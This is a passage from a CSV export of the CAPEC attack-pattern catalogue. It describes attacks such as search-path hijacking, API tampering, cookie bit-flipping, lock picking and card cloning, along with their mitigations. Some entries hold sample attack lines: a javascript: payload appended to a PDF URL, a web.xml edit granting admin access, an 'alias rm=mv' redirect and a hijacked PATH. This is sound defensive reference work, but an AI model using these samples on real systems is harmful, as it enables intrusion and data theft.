ID:636::NATURE:PeerOf:CAPEC ID:23::NATURE:PeerOf:CAPEC ID:75::\",\"\",\"::The attacker must have the ability to modify non-executable files consumed by the target software.::\",\"::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::\",\"::Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Enforce principle of least privilege::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.::Implementation: Ensure that files that are not required to execute, such as configuration files, are not over-privileged, i.e. not allowed to execute.::\",\"::Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix cp command can be rerouted to rm or other standard command so the user's intention is subverted.::The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser.::Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/) http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here The client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process.::The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name public grants all users with the public role the ability to use the administration functionality. < security-constraint><description>Security processing rules for admin screens</description><url-pattern>/admin/*</url-pattern><http-method>POST</http-method><http-method>GET</http-method><auth-constraint><role-name>administrator</role-name><role-name>public</role-name> </auth-constraint> </security-constraint> The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control.::\",\"::94::96::95::97::272::59::282::270::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.006:ENTRY NAME:Obfuscated Files or Information: HTML Smuggling::::TAXONOMY NAME:ATTACK:ENTRY ID:1027.009:ENTRY NAME:Obfuscated Files or Information: Embedded Payloads::::TAXONOMY NAME:ATTACK:ENTRY ID:1564.009:ENTRY NAME:Hide Artifacts: Resource Forking::\",\"\",\n36,\"Using Unpublished Interfaces or Functionality\",Standard,Draft,\"An adversary searches for and invokes interfaces or functionality that the target system designers did not intend to be publicly available. If interfaces fail to authenticate requests, the attacker may be able to invoke functionality they are not authorized for.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:113::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify services] Discover a service of interest by exploring service registry listings or by connecting on a known port or some similar means.:TECHNIQUE:Search via internet for known, published services.:TECHNIQUE:Use automated tools to scan known ports to identify internet-enabled services.:TECHNIQUE:Dump the code from the chip and then perform reverse engineering to analyze the code.::STEP:2:PHASE:Explore:DESCRIPTION:[Authenticate to service] Authenticate to the service, if required, in order to explore it.:TECHNIQUE:Use published credentials to access system.:TECHNIQUE:Find unpublished credentials to access service.:TECHNIQUE:Use other attack pattern or weakness to bypass authentication.::STEP:3:PHASE:Explore:DESCRIPTION:[Identify all interfaces] Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.:TECHNIQUE:For any published services, determine exposed interfaces via the documentation provided.:TECHNIQUE:For any services found, use error messages from poorly formed service calls to determine valid interfaces. In some cases, services will respond to poorly formed calls with valid ones.::STEP:4:PHASE:Experiment:DESCRIPTION:[Attempt to discover unpublished functions] Using manual or automated means, discover unpublished or undocumented functions exposed by the service.:TECHNIQUE:Manually attempt calls to the service using an educated guess approach, including the use of terms like' 'test', 'debug', 'delete', etc.:TECHNIQUE:Use automated tools to scan the service to attempt to reverse engineer exposed, but undocumented, features.::STEP:5:PHASE:Exploit:DESCRIPTION:[Exploit unpublished functions] Using information determined via experimentation, exploit the unpublished features of the service.:TECHNIQUE:Execute features that are not intended to be used by general system users.:TECHNIQUE:Craft malicious calls to features not intended to be used by general system users that take advantage of security flaws found in the functions.::\",\"::The architecture under attack must publish or otherwise make available services that clients can attach to, either in an unauthenticated fashion, or having obtained an authentication token elsewhere. The service need not be 'discoverable', but in the event it isn't it must have some way of being discovered by an attacker. This might include listening on a well-known port. Ultimately, the likelihood of exploit depends on discoverability of the vulnerable service.::\",\"::SKILL:A number of web service digging tools are available for free that help discover exposed web services and their interfaces. In the event that a web service is not listed, the attacker does not need to know much more in addition to the format of web service messages that they can sniff/monitor for.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack. Web service digging tools may be helpful.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Authenticating both services and their discovery, and protecting that authentication mechanism simply fixes the bulk of this problem. Protecting the authentication involves the standard means, including: 1) protecting the channel over which authentication occurs, 2) preventing the theft, forgery, or prediction of authentication credentials or the resultant tokens, or 3) subversion of password reset and the like.::\",\"::To an extent, Google services (such as Google Maps) are all well-known examples. Calling these services, or extending them for one's own (perhaps very different) purposes is as easy as knowing they exist. Their unencumbered public use, however, is a purposeful aspect of Google's business model. Most organizations, however, do not have the same business model. Organizations publishing services usually fall back on thoughts that Attackers will not know services exist and that even if they did, they wouldn't be able to access them because they're not on the local LAN. Simple threat modeling exercises usually uncovers simple attack vectors that can invalidate these assumptions.::\",\"::306::693::695::1242::\",\"\",\"\",\n37,\"Retrieve Embedded Sensitive Data\",Detailed,Draft,\"An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:167::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.:TECHNIQUE:Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.:TECHNIQUE:Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack.::STEP:2:PHASE:Exploit:DESCRIPTION:[Retrieve Embedded Data] The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to retrieve the information of interest.:TECHNIQUE:API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.:TECHNIQUE:Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.:TECHNIQUE:Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.:TECHNIQUE:Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, they attempt decoding in that format.::\",\"::In order to feasibly execute this type of attack, some valuable data must be present in client software.::Additionally, this information must be unprotected, or protected in a flawed fashion, or through a mechanism that fails to resist reverse engineering, statistical, or other attack.::\",\"::SKILL:The attacker must possess knowledge of client code structure as well as ability to reverse-engineer or decompile it or probe it in other ways. This knowledge is specific to the technology and language used for the client distribution:LEVEL:Medium::\",\"::The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as Strings or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"\",\"::Using a tool such as 'strings' or similar to pull out text data, perhaps part of a database table, that extends beyond what a particular user's purview should be.::An attacker can also use a decompiler to decompile a downloaded Java applet in order to look for information such as hardcoded IP addresses, file paths, passwords or other such contents.::Attacker uses a tool such as a browser plug-in to pull cookie or other token information that, from a previous user at the same machine (perhaps a kiosk), allows the attacker to log in as the previous user.::\",\"::226::311::525::312::314::315::318::1239::1258::1266::1272::1278::1301::1330::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecured Credentials: Private Keys::\",\"\",\n38,\"Leveraging/Manipulating Configuration File Search Paths\",Detailed,Draft,\"This pattern of attack sees an adversary load a malicious resource into a program's standard path so that when a known command is executed then the system instead executes the malicious component. The adversary can either modify the search path a program uses, like a PATH variable or classpath, or they can manipulate resources on the path to point to their malicious components. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:159::\",\"\",\"::The attacker must be able to write to redirect search paths on the victim host.::\",\"::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Enforce principle of least privilege::Design: Ensure that the program's compound parts, including all system dependencies, classpath, path, and so on, are secured to the same or higher level assurance as the program::Implementation: Host integrity monitoring::\",\"::Another method is to redirect commands by aliasing one legitimate command to another to create unexpected results. the Unix command rm could be aliased to mv and move all files the victim thinks they are deleting to a directory the attacker controls. In a Unix shell .profile setting alias rm=mv /usr/home/attacker In this case the attacker retains a copy of all the files the victim attempts to remove.::A standard UNIX path looks similar to this /bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin If the attacker modifies the path variable to point to a locale that includes malicious resources then the user unwittingly can execute commands on the attackers' behalf: /evildir/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin This is a form of usurping control of the program and the attack can be done on the classpath, database resources, or any other resources built from compound parts. At runtime detection and blocking of this attack is nearly impossible, because the configuration allows execution.::\",\"::426::427::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.007:ENTRY NAME:Hijack Execution Flow: Path Interception by PATH Environment Variable::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.009:ENTRY NAME:Hijack Execution Flow: Path Interception by Unquoted Path::\",\"\",\n383,\"Harvesting Information via API Event Monitoring\",Detailed,Draft,\"An adversary hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the adversary creating an event within the sub-application. Assume the adversary hosts a virtual sale of rare items. As other users enter the event, the attacker records via AiTM (CAPEC-94) proxy the user_ids and usernames of everyone who attends. The adversary would then be able to spam those users within the application using an automated script.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:407::NATURE:CanPrecede:CAPEC ID:94::\",\"\",\"::The target software is utilizing application framework APIs::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The adversary is able to gather information to potentially support further nefarious activities.::\",\"::Leverage encryption techniques during information transactions so as to protect them from attack patterns of this kind.::\",\"\",\"::311::319::419::602::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1056.004:ENTRY NAME:Input Capture: Credential API Hooking::\",\"\",\n384,\"Application API Message Manipulation via Man-in-the-Middle\",Standard,Draft,\"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to perform adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system. Despite the use of AiTH software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true Adversary-in-the-Middle attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:94::\",\"\",\"::Targeted software is utilizing application framework APIs::\",\"\",\"::A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.::\",\"\",\"\",\"\",\"\",\"::471::345::346::602::311::\",\"\",\"\",\n385,\"Transaction or Event Tampering via Application API Manipulation\",Detailed,Draft,\"An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:384::\",\"\",\"::Targeted software is utilizing application framework APIs::\",\"\",\"::A software program that allows the use of adversary-in-the-middle communications (CAPEC-94) between the client and server, such as a man-in-the-middle proxy.::\",\"\",\"\",\"\",\"\",\"::471::345::346::602::311::\",\"\",\"\",\n386,\"Application API Navigation Remapping\",Standard,Draft,\"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:94::\",\"\",\"::Targeted software is utilizing application framework APIs::\",\"\",\"::A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a man-in-the-middle proxy.::\",\"\",\"\",\"\",\"\",\"::471::345::346::602::311::\",\"\",\"\",\n387,\"Navigation Remapping To Propagate Malicious Content\",Detailed,Draft,\"An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:386::\",\"\",\"::Targeted software is utilizing application framework APIs::\",\"\",\"::A software program that allows the use of adversary-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.::\",\"\",\"\",\"\",\"\",\"::471::345::346::602::311::\",\"\",\"\",\n388,\"Application API Button Hijacking\",Detailed,Draft,\"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:386::\",\"\",\"::Targeted software is utilizing application framework APIs::\",\"\",\"::A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a adversary-in-the-middle (CAPEC-94) proxy.::\",\"\",\"\",\"\",\"::An in-game event occurs and the attacker traps the result, which turns out to be a form that will be populated to their primary profile. The attacker, using a MITM proxy, observes the following data: [Button][Claim_Item]Sourdough_Cookie[URL_IMG]foo[/URL_IMG][Claim_Link]bar[/Claim_Link] By altering the destination of Claim_Link to point to the attackers' server an unwitting victim can be enticed to click the link. Another example would be for the attacker to rewrite the button destinations for an event so that clicking Yes or No causes the user to load the attackers' code.::\",\"::471::345::346::602::311::\",\"\",\"\",\n389,\"Content Spoofing Via Application API Manipulation\",Detailed,Draft,\"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. The techniques require use of specialized software that allow the attacker to use adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:384::\",\"\",\"::Targeted software is utilizing application framework APIs::\",\"\",\"::A software program that allows the use of adversary-in-the-middle communications between the client and server, such as an adversary-in-the-middle proxy.::\",\"\",\"\",\"\",\"\",\"::353::\",\"\",\"\",\n39,\"Manipulating Opaque Client-based Data Tokens\",Standard,Draft,\"In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:22::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Enumerate information passed to client side] The attacker identifies the parameters used as part of tokens to take business or security decisions:TECHNIQUE:Use WebScarab to reveal hidden fields while browsing.:TECHNIQUE:Use a sniffer to capture packets:TECHNIQUE:View source of web page to find hidden fields:TECHNIQUE:Examine URL to see if any opaque tokens are in it:TECHNIQUE:Disassemble or decompile client-side application:TECHNIQUE:Use debugging tools such as File Monitor, Registry Monitor, Debuggers, etc.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine protection mechanism for opaque token] The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.:TECHNIQUE:Look for signs of well-known character encodings:TECHNIQUE:Look for cryptographic signatures:TECHNIQUE:Look for delimiters or other indicators of structure::STEP:3:PHASE:Experiment:DESCRIPTION:[Modify parameter/token values] Trying each parameter in turn, the attacker modifies the values:TECHNIQUE:Modify tokens logically:TECHNIQUE:Modify tokens arithmetically:TECHNIQUE:Modify tokens bitwise:TECHNIQUE:Modify structural components of tokens:TECHNIQUE:Modify order of parameters/tokens::STEP:4:PHASE:Experiment:DESCRIPTION:[Cycle through values for each parameter.] Depending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the server:TECHNIQUE:Use network-level packet injection tools such as netcat:TECHNIQUE:Use application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.:TECHNIQUE:Use modified client (modified by reverse engineering):TECHNIQUE:Use debugging tools to modify data in client::\",\"::An attacker already has some access to the system or can steal the client based data tokens from another user who has access to the system.::For an Attacker to viably execute this attack, some data (later interpreted by the application) must be held client-side in a way that can be manipulated without detection. This means that the data or tokens are not CRCd as part of their value or through a separate meta-data store elsewhere.::\",\"::SKILL:If the client site token is obfuscated.:LEVEL:Medium::SKILL:If the client site token is encrypted.:LEVEL:High::\",\"::The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::One solution to this problem is to protect encrypted data with a CRC of some sort. If knowing who last manipulated the data is important, then using a cryptographic message authentication code (or hMAC) is prescribed. However, this guidance is not a panacea. In particular, any value created by (and therefore encrypted by) the client, which itself is a malicious value, all the protective cryptography in the world can't make the value 'correct' again. Put simply, if the client has control over the whole process of generating and encoding the value, then simply protecting its integrity doesn't help.::Make sure to protect client side authentication tokens for confidentiality (encryption) and integrity (signed hash)::Make sure that all session tokens use a good source of randomness::Perform validation on the server side to make sure that client side data tokens are consistent with what is expected.::\",\"::With certain price watching websites, that aggregate products available prices, the user can buy items through whichever vendors has product availability, the best price, or other differentiator. Once a user selects an item, the site must broker the purchase of that item with the vendor. Because vendors sell the same product through different channel partners at different prices, token exchange between price watching sites and selling vendors will often contain pricing information. With some price watching sites, manipulating URL-data (which is encrypted) even opaquely yields different prices charged by the fulfilling vendor. If the manipulated price turns out higher, the Attacker can cancel purchase. If the Attacker succeeded in manipulating the token and creating a lower price, they proceed.::Upon successful authentication user is granted an encrypted authentication cookie by the server and it is stored on the client. One piece of information stored in the authentication cookie reflects the access level of the user (e.g. u for user). The authentication cookie is encrypted using the Electronic Code Book (ECB) mode, that naively encrypts each of the plaintext blocks to each of the ciphertext blocks separately. An attacker knows the structure of the cookie and can figure out what bits (encrypted) store the information relating to the access level of the user. An attacker modifies the authentication cookie and effectively substitutes u for a by flipping some of the corresponding bits of ciphertext (trial and error). Once the correct flip is found, when the system is accessed, the attacker is granted administrative privileges in the system. Note that in this case an attacker did not have to figure out the exact encryption algorithm or find the secret key, but merely exploit the weakness inherent in using the ECB encryption mode.::Archangel Weblog 0.90.02 allows remote attackers to bypass authentication by setting the ba_admin cookie to 1. See also: CVE-2006-0944::\",\"::353::285::302::472::565::315::539::384::233::\",\"\",\"\",\n390,\"Bypassing Physical Security\",Meta,Draft,\"Facilities often used layered models for physical security such as traditional locks, Electronic-based card entry systems, coupled with physical alarms. Hardware security mechanisms range from the use of computer case and cable locks as well as RFID tags for tracking computer assets. This layered approach makes it difficult for random physical security breaches to go unnoticed, but is less effective at stopping deliberate and carefully planned break-ins. Avoiding detection begins with evading building security and surveillance and methods for bypassing the electronic or physical locks which secure entry points.\",\"\",,,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n391,\"Bypassing Physical Locks\",Standard,Draft,\"An attacker uses techniques and methods to bypass physical security measures of a building or facility. Physical locks may range from traditional lock and key mechanisms, cable locks used to secure laptops or servers, locks on server cases, or other such devices. Techniques such as lock bumping, lock forcing via snap guns, or lock picking can be employed to bypass those locks and gain access to the facilities or devices they protect, although stealth, evidence of tampering, and the integrity of the lock following an attack, are considerations that may determine the method employed. Physical locks are limited by the complexity of the locking mechanism. While some locks may offer protections such as shock resistant foam to prevent bumping or lock forcing methods, many commonly employed locks offer no such countermeasures.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:390::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n392,\"Lock Bumping\",Detailed,Draft,\"An attacker uses a bump key to force a lock on a building or facility and gain entry. Lock Bumping is the use of a special type of key that can be tapped or bumped to cause the pins within the lock to fall into temporary alignment, allowing the lock to be opened. Lock bumping allows an attacker to open a lock without having the correct key. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A bump key is a specially constructed key that exploits this design. When the bump key is struck or firmly tapped, its teeth transfer the force of the tap into the key pins, causing the lock to momentarily shift into proper alignment for the mechanism to be opened.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:391::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n393,\"Lock Picking\",Detailed,Draft,\"An attacker uses lock picking tools and techniques to bypass the locks on a building or facility. Lock picking is the use of a special set of tools to manipulate the pins within a lock. Different sets of tools are required for each type of lock. Lock picking attacks have the advantage of being non-invasive in that if performed correctly the lock will not be damaged. A standard lock pin-and-tumbler lock is secured by a set of internal pins that prevent the tumbler device from turning. Spring loaded driver pins push down on the key pins preventing rotation so that the bolt remains in a locked position.. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. Most common locks, such as domestic locks in the US, can be picked using a standard 2 tools (i.e. a torsion wrench and a hook pick).\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:391::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n394,\"Using a Snap Gun Lock to Force a Lock\",Detailed,Draft,\"An attacker uses a Snap Gun, also known as a Pick Gun, to force the lock on a building or facility. A Pick Gun is a special type of lock picking instrument that works on similar principles as lock bumping. A snap gun is a hand-held device with an attached metal pick. The metal pick strikes the pins within the lock, transferring motion from the key pins to the driver pins and forcing the lock into momentary alignment. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A Snap Gun exploits this design by using a metal pin to strike all of the key pins at once, forcing the driver pins to shift into an unlocked position. Unlike bump keys or lock picks, a Snap Gun may damage the lock more easily, leaving evidence that the lock has been tampered with.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:391::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n395,\"Bypassing Electronic Locks and Access Controls\",Standard,Draft,\"An attacker exploits security assumptions to bypass electronic locks or other forms of access controls. Most attacks against electronic access controls follow similar methods but utilize different tools. Some electronic locks utilize magnetic strip cards, others employ RFID tags embedded within a card or badge, or may involve more sophisticated protections such as voice-print, thumb-print, or retinal biometrics. Magnetic Strip and RFID technologies are the most widespread because they are cost effective to deploy and more easily integrated with other electronic security measures. These technologies share common weaknesses that an attacker can exploit to gain access to a facility protected by the mechanisms via copying legitimate cards or badges, or generating new cards using reverse-engineered algorithms.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:390::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n397,\"Cloning Magnetic Strip Cards\",Detailed,Draft,\"An attacker duplicates the data on a Magnetic strip card (i.e. 'swipe card' or 'magstripe') to gain unauthorized access to a physical location or a person's private information. Magstripe cards encode data on a band of iron-based magnetic particles arrayed in a stripe along a rectangular card. Most magstripe card data formats conform to ISO standards 7810, 7811, 7813, 8583, and 4909. The primary advantage of magstripe technology is ease of encoding and portability, but this also renders magnetic strip cards susceptible to unauthorized duplication. If magstripe cards are used for access control, all an attacker need do is obtain a valid card long enough to make a copy of the card and then return the card to its location (i.e. a co-worker's desk). Magstripe reader/writers are widely available as well as software for analyzing data encoded on the cards. By swiping a valid card, it becomes trivial to make any number of duplicates that function as the original.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:395::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n398,\"Magnetic Strip Card Brute Force Attacks\",Detailed,Draft,\"An adversary analyzes the data on two or more magnetic strip cards and is able to generate new cards containing valid sequences that allow unauthorized access and/or impersonation of individuals.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:395::\",\"\",\"::The ability to calculate a card checksum and write out a valid checksum value. Some cards are protected by a checksum calculation, therefore it is necessary to determine what algorithm is being used to calculate the checksum and to employ that algorithm to calculate and write a new valid checksum for the card being created.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n399,\"Cloning RFID Cards or Chips\",Detailed,Draft,\"An attacker analyzes data returned by an RFID chip and uses this information to duplicate a RFID signal that responds identically to the target chip. In some cases RFID chips are used for building access control, employee identification, or as markers on products being delivered along a supply chain. Some organizations also embed RFID tags inside computer assets to trigger alarms if they are removed from particular rooms, zones, or buildings. Similar to Magnetic strip cards, RFID cards are susceptible to duplication (cloning) and reuse.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:395::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n4,\"Using Alternative IP Address Encodings\",Detailed,Draft,\"This attack relies on the adversary using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names (FQDNs), URL, IP address, or IP Address ranges. If the location information is not validated against a variety of different possible encodings and formats, the adversary can use an alternate format to bypass application access control.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for IP addresses as user input] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application where IP addresses are used.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and attempts alternate IP address encodings, observing application behavior. The adversary will also attempt to access the application through an alternate IP address encoding to see if access control changes:TECHNIQUE:Instead of using a URL, use the IP address that the URL resolves to:TECHNIQUE:Specify a port directly to a URL input:TECHNIQUE:Omit or add http:// or https:// to a URL to see if the application behaves differently::STEP:3:PHASE:Exploit:DESCRIPTION:[Bypass access control] Using an alternate IP address encoding, the adversary will either access the application or give the alternate encoding as input, bypassing access control restrictions.::\",\"::The target software must fail to anticipate all of the possible valid encodings of an IP/web address.::The adversary must have the ability to communicate with the server.::\",\"::SKILL:The adversary has only to try IP address format combinations.:LEVEL:Low::\",\"::The adversary needs to have knowledge of an alternative IP address encoding that bypasses the access control policy of an application. Alternatively, the adversary can simply try to brute-force various encoding possibilities.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Default deny access control 